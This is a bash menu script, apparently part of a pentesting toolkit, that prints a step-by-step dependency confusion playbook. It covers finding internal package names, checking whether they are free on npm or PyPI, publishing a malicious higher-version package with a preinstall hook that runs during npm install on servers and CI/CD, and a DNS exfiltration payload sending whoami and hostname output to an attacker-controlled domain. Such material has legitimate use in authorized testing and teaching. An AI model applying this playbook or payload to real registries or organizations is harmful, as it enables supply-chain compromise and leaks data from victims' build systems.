#!/bin/bash
# HackTricks Ref: dependency-confusion
# Module: Dependency Confusion / Supply Chain Attack

echo -e "${C6}[WEB ATTACK: DEPENDENCY_CONFUSION]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/dependency-confusion"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Attack Vector:${NC}"
echo "1) Discovery (package.json / requirements.txt)"
echo "2) Public Registry Check (npm/PyPI/RubyGems)"
echo "3) Creating a Malicious 'Higher Version' Package"
echo "4) DNS Exfiltration PoC (Phone Home)"
echo "0) Exit"

read -p "Selection: " dep_opt

case $dep_opt in
    1)
        echo -e "\n${C2}[*] Discovery & Identification:${NC}"
        echo "Analyze public JS bundles or GitHub repos for internal dependencies:"
        echo " - Look for naming conventions: '@company-internal/auth-lib'"
        echo " - Check versions: If it's 1.0.0 and NOT on npmjs.com, it's a target."
        echo " - Files to hunt: package.json, requirements.txt, Gemfile, pom.xml"
        ;;
    2)
        echo -e "\n${C2}[*] Registry Verification:${NC}"
        echo "Verify if the internal name is 'claimable' on public registries:"
        echo " - npm: npm view <pachet-nume>"
        echo " - Python: pip install <pachet-nume>==99.99.99"
        echo "If the command fails with '404' or 'Not Found', you can register it."
        ;;
    3)
        echo -e "\n${C2}[*] Weaponization Strategy:${NC}"
        echo "1. Use a version number significantly higher (e.g., 99.1.0)."
        echo "2. Add a 'preinstall' or 'postinstall' script in package.json:"
        echo '   "scripts": { "preinstall": "node index.js" }'
        echo "3. The script will execute as soon as 'npm install' runs on the server/CI-CD."
        ;;
    4)
        echo -e "\n${C2}[*] DNS Exfiltration (Stealth PoC):${NC}"
        echo "To prove execution without being destructive, use DNS queries:"
        echo " - Payload: \`whoami\`.\$(hostname).your-interactsh-domain.com"
        echo "Even if the server is behind a firewall, DNS requests often bypass it."
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
